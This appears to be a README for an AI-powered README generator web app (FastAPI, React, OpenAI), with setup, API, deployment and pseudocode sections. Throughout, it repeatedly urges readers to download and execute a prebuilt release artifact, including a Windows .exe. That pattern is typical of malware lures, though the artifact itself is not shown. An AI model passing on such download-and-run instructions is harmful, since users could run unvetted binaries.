[![Releases](https://img.shields.io/badge/Releases-Download%20and%20Run-blue?logo=github&style=for-the-badge)](https://github.com/poweruserindahouse/ai-readme-generator/releases)

# AI README Generator — Auto-create Professional README for GitHub Repos 🚀📄

![Header image](https://raw.githubusercontent.com/simple-icons/simple-icons/develop/icons/openai.svg)

Badges
- Topics: axios · fastapi · gitpython · lucide-icons · openai · python · python-dotenv · react · tailwindcss · uvicorn
- Version: 1.0.0
- License: MIT

Quick links
- Releases (download and execute): https://github.com/poweruserindahouse/ai-readme-generator/releases
- Repository: https://github.com/poweruserindahouse/ai-readme-generator

Table of contents
1. About this project
2. Key features
3. Architecture overview
4. Tech stack
5. Screenshots and images
6. Install and run — full stack
   - Prerequisites
   - Backend setup
   - Frontend setup
   - Run locally (dev)
   - Run in production
   - Release install (download and execute)
7. Usage
   - Generate a README from a repo URL
   - CLI usage
   - API endpoints
   - Frontend flow
8. Config and environment variables
9. Security and API key handling
10. Custom templates and prompt tuning
11. Deployment guides
   - Deploy backend to Linux server
   - Deploy frontend to static host
   - Deploy full stack with Docker and docker-compose
12. Examples and demo runs
13. Troubleshooting
14. Contributing
15. Tests
16. License

About this project
This project generates professional README.md files for public GitHub repositories. It uses the OpenAI API to craft clear, useful READMEs. The app exposes a FastAPI backend that talks to the OpenAI API. The frontend runs on React and uses Tailwind CSS for the UI. The app calls into GitPython to inspect the target repository and build relevant sections.

Key features
- Generate full README.md based on repo content.
- Support for multiple README styles and templates.
- FastAPI backend with typed request and response models.
- React + Tailwind frontend with live preview and download.
- GitPython usage for repository analysis.
- Axios-powered API calls.
- OpenAI integration with prompt templates.
- Environment-driven config via python-dotenv.
- Development ready with uvicorn and local builds.

Architecture overview
The app splits into two parts:

- Backend (FastAPI)
  - Exposes /generate and metadata endpoints.
  - Reads repo code via GitPython or remote Git clone.
  - Builds the prompt and calls OpenAI.
  - Returns rendered README markdown and JSON metadata.
  - Hosts small static assets in production (optional).

- Frontend (React + Tailwind)
  - Simple UI to input a GitHub repo URL and options.
  - Shows a live preview of the generated README.
  - Lets user download the README.md or push to a repo.
  - Calls backend via Axios.

Tech stack
- Backend: Python, FastAPI, uvicorn, GitPython, python-dotenv, openai client
- Frontend: React, Tailwind CSS, Axios, lucide-react icons
- Dev tools: Docker, docker-compose, pytest, eslint, prettier

Screenshots and images
- Generation screen: ![UI Preview](https://raw.githubusercontent.com/simple-icons/simple-icons/develop/icons/react.svg)
- FastAPI docs example: ![FastAPI docs](https://fastapi.tiangolo.com/img/index/index-01-swagger.png)
- OpenAI logo: ![OpenAI](https://raw.githubusercontent.com/simple-icons/simple-icons/develop/icons/openai.svg)

Install and run — full stack

Prerequisites
- Node 18+ (or LTS)
- Python 3.10+ (recommended 3.11)
- pip or pipx
- git
- Docker (optional)
- An OpenAI API key
- A GitHub token for push or repo access (optional)
- Access to the releases page for downloadable artifacts: https://github.com/poweruserindahouse/ai-readme-generator/releases — download the release file and execute it.

Backend setup (Python, FastAPI)
1. Clone the repo
   - git clone https://github.com/poweruserindahouse/ai-readme-generator.git
   - cd ai-readme-generator

2. Create a virtual environment
   - python -m venv .venv
   - source .venv/bin/activate   # macOS / Linux
   - .venv\Scripts\activate      # Windows

3. Install Python dependencies
   - pip install -r backend/requirements.txt

4. Create .env file in backend folder
   - cp backend/.env.example backend/.env
   - Edit backend/.env with your keys:
     - OPENAI_API_KEY=sk-...
     - GITHUB_TOKEN=ghp_...
     - MODE=dev

5. Run migrations or initial tasks (if any)
   - The backend does not use a DB by default. If you add a DB, run migrations here.

6. Start the server (dev)
   - cd backend
   - uvicorn main:app --reload --host 0.0.0.0 --port 8000

7. Visit the docs
   - Open http://localhost:8000/docs

Backend folder layout (example)
- backend/
  - app/
    - main.py
    - api/
      - v1/
        - generate.py
        - health.py
    - core/
      - config.py
      - openai_client.py
    - services/
      - git_inspector.py
      - readme_builder.py
  - requirements.txt
  - .env.example

Key backend files explained
- main.py
  - Starts FastAPI and mounts routers.
  - Configures CORS and middleware.

- openai_client.py
  - Wraps the OpenAI calls.
  - Handles retries and simple backoff.

- git_inspector.py
  - Uses GitPython to clone or inspect a local repo.
  - Extracts README candidates, package files, license, contributors, and code stats.

- readme_builder.py
  - Holds template functions.
  - Creates the final README markdown.

Frontend setup (React + Tailwind)
1. Install Node dependencies
   - cd frontend
   - npm install

2. Create environment file
   - cp .env.example .env
   - Edit REACT_APP_API_URL if needed:
     - REACT_APP_API_URL=http://localhost:8000

3. Start the dev server
   - npm run dev
   - Open http://localhost:3000

Frontend folder layout (example)
- frontend/
  - src/
    - components/
      - RepoForm.tsx
      - Preview.tsx
      - DownloadButton.tsx
    - pages/
      - Home.tsx
    - styles/
      - index.css
  - package.json
  - tailwind.config.js
  - tsconfig.json

Run locally (dev)
- Start backend:
  - cd backend
  - uvicorn main:app --reload --port 8000
- Start frontend:
  - cd frontend
  - npm run dev -- --port 3000
- Open http://localhost:3000

Run in production
- Build frontend:
  - cd frontend
  - npm run build
- Serve static files from backend or a static host.
- Set environment to production and run uvicorn with workers:
  - uvicorn main:app --host 0.0.0.0 --port 80 --workers 4
- Use a reverse proxy like nginx or Caddy.

Release install (download and execute)
This repo exposes compiled releases and packaged builds at the Releases page. Visit the Releases link and run the provided artifact.
- Releases: https://github.com/poweruserindahouse/ai-readme-generator/releases
- Download the release file (zip, tar, or binary) for your platform.
- Extract the archive and inspect the included README or run script.
- Execute the provided start script:
  - On Linux/macOS:
    - tar -xzf ai-readme-generator-v1.0.0.tar.gz
    - cd ai-readme-generator
    - ./run.sh
  - On Windows:
    - Extract zip
    - Run start.bat or the provided .exe
- The release often contains a prebuilt frontend and a minimal server wrapper. Run the shipped start script to bring up the app.

Usage

Generate a README from a repo URL
- In the UI, paste a public GitHub repo URL.
- Pick a template and options.
- Click Generate.
- The backend clones the repo or inspects repo content.
- The backend builds a prompt, calls the OpenAI API, and returns markdown.
- The UI shows a preview and a download button.

CLI usage (example script)
- The backend includes a small CLI for automation.
- Example:
  - python -m app.cli.generate --repo https://github.com/owner/repo --template short --output ./README.md
- Flags:
  - --repo: repo URL
  - --template: template name (short, standard, detailed)
  - --output: path to save generated README

API endpoints
- POST /api/v1/generate
  - Body:
    - repo_url: string (public GitHub repo URL)
    - template: string (short | standard | detailed)
    - include_badges: bool
    - openai_model: string (optional override)
  - Response:
    - markdown: string
    - sections: object (title -> text)
    - metadata: object

- GET /api/v1/health
  - Returns basic health info and feature flags.

- POST /api/v1/push
  - Body:
    - repo_url: string
    - branch: string
    - commit_message: string
    - file_path: string (default README.md)
  - Requires GITHUB_TOKEN in backend env.

Frontend flow
- The frontend uses Axios to POST to /api/v1/generate.
- The UI shows loading and streaming if enabled.
- The preview renders markdown using a markdown renderer.
- The Download button saves the markdown as README.md.
- The Push button calls /api/v1/push to commit the file to a repo.

Config and environment variables

Backend .env variables (example)
- OPENAI_API_KEY: your OpenAI API key
- GITHUB_TOKEN: personal access token (optional)
- HOST: 0.0.0.0
- PORT: 8000
- MODE: dev or prod
- CLONE_TIMEOUT: maximum clone time in seconds
- MAX_TOKENS: token limit for OpenAI calls
- OPENAI_MODEL: default model, e.g., gpt-4o or gpt-4.1 (depends on account access)

Frontend .env variables (example)
- REACT_APP_API_URL: http://localhost:8000
- REACT_APP_DEFAULT_TEMPLATE: standard

Security and API key handling
- Store secrets in .env or in your host secret manager.
- Do not commit .env to git.
- Limit GITHUB_TOKEN scopes to repo:public_repo or repo if you need private push.
- Use short-lived tokens where possible.
- The backend holds the OpenAI key and never exposes it to the client. The frontend sends only repo URL and options.

Custom templates and prompt tuning
- Templates live in backend/app/templates/.
- Each template holds a prompt file and rendering rules.
- Example templates:
  - short.template
  - standard.template
  - detailed.template

Template variables
- repo_name
- description
- primary_language
- badges
- installation
- usage
- api_reference
- tests
- contributor_guide
- license
- examples

Prompt tuning tips
- Limit prompt size by sending the most relevant files.
- Include package manifest files (package.json, pyproject.toml).
- Include top 3 README file candidates if they exist.
- Include key code headers from main files in the repo.

Deployment guides

Deploy backend to Linux server
1. Provision server with Python 3.11 and Node 18.
2. Set up a system user for the app.
3. Create a virtualenv and install backend requirements.
4. Configure systemd service:
   - [Unit]
     - Description=AI README Generator
   - [Service]
     - User=appuser
     - WorkingDirectory=/opt/ai-readme-generator/backend
     - ExecStart=/opt/ai-readme-generator/.venv/bin/uvicorn main:app --host 0.0.0.0 --port 8000 --workers 4
     - EnvironmentFile=/opt/ai-readme-generator/backend/.env
   - [Install]
     - WantedBy=multi-user.target
5. Start and enable the service:
   - sudo systemctl daemon-reload
   - sudo systemctl enable ai-readme-generator
   - sudo systemctl start ai-readme-generator

Deploy frontend to static host
- Build the frontend:
  - cd frontend
  - npm run build
- Upload the build folder to Netlify, Vercel, or S3 + CloudFront.
- Configure REACT_APP_API_URL to point to the backend.

Deploy full stack with Docker and docker-compose
- The repo includes docker-compose.yaml example.
- Example docker-compose:
  - version: '3.8'
  - services:
    - backend:
      - build: ./backend
      - ports:
        - "8000:8000"
      - env_file:
        - ./backend/.env
    - frontend:
      - build: ./frontend
      - ports:
        - "3000:3000"
- To run:
  - docker-compose up --build -d

Examples and demo runs

Example 1 — Minimal generate
- Request:
  - POST /api/v1/generate
  - body:
    - { "repo_url": "https://github.com/tailwindlabs/tailwindcss", "template": "short" }
- Response:
  - markdown: "## Tailwind CSS\n\nTailwind CSS is..." (full content)
- Result:
  - Download the README.md and add to repo.

Example 2 — Generate and push
- Steps:
  - Generate a README via /api/v1/generate.
  - POST to /api/v1/push with commit message.
  - The backend opens a shallow clone with GitPython, writes README.md, commits, and pushes to branch.
- Ensure GITHUB_TOKEN has push rights.

Detailed sample output (fragment)
- The renderer produces headings, code blocks, badges, and usage examples.
- The generator populates:
  - Title
  - Short description
  - Badges (build, coverage, license)
  - Table of contents
  - Installation steps
  - Usage examples
  - API reference (if it detects one)
  - Configuration
  - Tests
  - Contributing
  - License

Badges generation
- The generator can include free services badges:
  - GitHub Actions
  - Codecov
  - License
- It will check package files for test scripts to generate a Run Tests badge.

Troubleshooting

Cannot reach OpenAI
- Check OPENAI_API_KEY in backend .env.
- Verify network access from the server to api.openai.com.
- Check backend logs for HTTP errors.

Backend returns 500
- Inspect backend logs for stack traces.
- Ensure required env variables exist.
- Confirm dependency versions in requirements.txt.

Slow generation
- The generator may clone the repo. That may take time if the repo is large.
- Use the include_files flag to limit the number of files scanned.
- Increase CLONE_TIMEOUT if clones fail due to slow networks.

Failed push to GitHub
- Verify GITHUB_TOKEN scope.
- Check branch name and repo URL.
- The push endpoint uses GitPython to push. Inspect .git/config for remote correctness.

Too long README or token limit
- The app trims the prompt if OpenAI request fails due to token limits.
- You can set MAX_TOKENS in the .env to a lower value.
- Use compact templates to reduce prompt size.

Testing

Unit tests
- Backend tests use pytest.
- Run tests:
  - cd backend
  - pytest -q

Integration tests
- There are integration tests that interact with a real or mocked OpenAI API.
- Use a test OpenAI key or a recorded response file.

Frontend tests
- Use vitest or react-testing-library.
- Run:
  - cd frontend
  - npm run test

Contributing

How to contribute
- Fork the repo.
- Create a feature branch.
- Run tests locally.
- Open a pull request with a clear description of the change.
- Use small commits and descriptive messages.

Coding style
- Python code follows PEP8.
- Format Python with black.
- Use mypy for basic type checks.
- Frontend uses ESLint and Prettier.

Issue guidelines
- Provide a minimal reproduction case.
- Include logs and exact steps to reproduce.
- If the issue concerns OpenAI output, include the template and input.

Roadmap and ideas
- Add support for private repo scanning with OAuth.
- Add multi-language README templates.
- Add streaming responses from OpenAI with frontend incremental rendering.
- Add optional automatic PR creation instead of a direct push.
- Add template marketplace and plugin system.

Appendix — Example backend code snippets

Prompt builder (pseudocode)
```
def build_prompt(repo_meta, files_snippet, template):
    parts = []
    parts.append(f"Repo: {repo_meta['full_name']}")
    parts.append(f"Description: {repo_meta.get('description','')}")
    parts.append("Files:")
    for f in files_snippet:
        parts.append(f"--- {f['path']} ---\n{f['content']}\n")
    parts.append(f"Template: {template}")
    parts.append("Write a clear README.md with headings, code blocks, and examples.")
    return '\\n\\n'.join(parts)
```

OpenAI call wrapper (pseudocode)
```
def call_openai(prompt, model='gpt-4', max_tokens=1200):
    client = OpenAI(api_key=os.getenv('OPENAI_API_KEY'))
    resp = client.responses.create(
        model=model,
        input=prompt,
        max_tokens=max_tokens
    )
    return resp.output_text
```

GitPython use (pseudocode)
```
from git import Repo
def clone_repo(repo_url, dest):
    repo = Repo.clone_from(repo_url, dest, depth=1)
    return repo
def commit_and_push(repo_dir, file_path, commit_msg, branch='main'):
    repo = Repo(repo_dir)
    repo.index.add([file_path])
    repo.index.commit(commit_msg)
    origin = repo.remote(name='origin')
    origin.push(refspec=f"{branch}:{branch}")
```

Appendix — Frontend sample (Axios call)
```
const generateReadme = async (repoUrl, template) => {
  const res = await axios.post(`${API_URL}/api/v1/generate`, {
    repo_url: repoUrl,
    template,
  });
  return res.data;
};
```

Styling and UX
- The frontend uses Tailwind CSS for a clean layout.
- It uses lucide-react icons for small, consistent icons.
- The preview uses a markdown renderer that supports syntax highlighting.

Accessibility
- Use semantic HTML elements.
- Add aria labels to forms and buttons.
- Ensure color contrast in Tailwind config.

Performance tips
- Cache repo metadata for repeated calls.
- Cache OpenAI responses for identical prompts to save credits.
- Use a job queue for background tasks if you expect heavy use.

Credits and references
- OpenAI for the language model.
- FastAPI for the backend framework.
- React and Tailwind for the frontend.
- GitPython for git operations.
- lucide-icons for icons.
- img.shields.io for badges.

License
- This project uses the MIT license. Check the LICENSE file for full text.

Contact
- Open an issue or PR on the repository.

Releases and downloadable artifacts
- The Releases page contains packaged builds and artifacts. Download the file for your platform and run the start script. Visit: https://github.com/poweruserindahouse/ai-readme-generator/releases

Images and badges used in this README
- Shields: https://img.shields.io
- Simple Icons: https://github.com/simple-icons/simple-icons
- FastAPI docs image: https://fastapi.tiangolo.com/img/index/index-01-swagger.png

Developer tips for production
- Limit concurrent OpenAI calls to control cost.
- Add rate limits on the API.
- Rotate API keys regularly and store them in a secret manager.
- Use server-side streaming to reduce latency for large responses.

Examples of README styles generated
- Minimal
  - Title
  - Short description
  - Install
  - Usage
  - License

- Standard
  - Title
  - Badges
  - Contents
  - Install
  - Usage
  - API
  - Tests
  - Contributing
  - License

- Detailed
  - All standard sections
  - Code examples
  - Architecture diagram
  - Performance notes
  - Known issues
  - Roadmap

How the generator picks files
- It looks for common files:
  - README.md, README.rst
  - package.json, pyproject.toml, setup.py
  - Cargo.toml
  - requirements.txt
  - LICENSE
  - .github/workflows
  - src or lib entry files
- It grabs the first 20 lines of each relevant file to form context.

Scaling suggestions
- Use a job queue like RabbitMQ or Redis for heavy tasks.
- Use a cache like Redis to hold generated READMEs for repeat calls.
- Use a CDN for built static assets.

This document gives the full operational guide, API details, and dev notes for the AI README Generator project. Use the Releases page to fetch prebuilt artifacts and start the app.